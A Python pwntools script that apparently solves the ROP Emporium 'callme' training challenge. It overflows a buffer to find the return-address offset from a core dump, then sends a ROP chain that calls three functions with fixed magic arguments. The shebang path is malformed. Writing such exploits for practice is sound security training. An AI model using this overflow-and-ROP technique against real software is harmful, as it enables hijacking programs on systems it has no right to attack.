#!/bin/usr/python3
from pwn import *

def start():
	p = process("./callme")
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

elf = context.binary = ELF("./callme")
context.log_level = "info"
context.delete_corefiles = True

rop = ROP(elf)
pop_rdi_rsi_rdx = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
callme_one = elf.symbols.callme_one
callme_two = elf.symbols.callme_two
callme_three = elf.symbols.callme_three

io = start()

payload = cyclic(100)
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

rsp = core.rsp
pattern = core.read(rsp, 4)
rip_offset = cyclic_find(pattern)
info("rip offset = %#x", rip_offset)

io = start()
payload = flat(
	asm('nop') * rip_offset,
	pop_rdi_rsi_rdx,
	0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d,
	callme_one,
	pop_rdi_rsi_rdx,
	0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d,
	callme_two,
	pop_rdi_rsi_rdx,
	0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d,
	callme_three
)
io.sendlineafter(">", payload)

while True:
	tmp = io.recv()
	info(tmp)








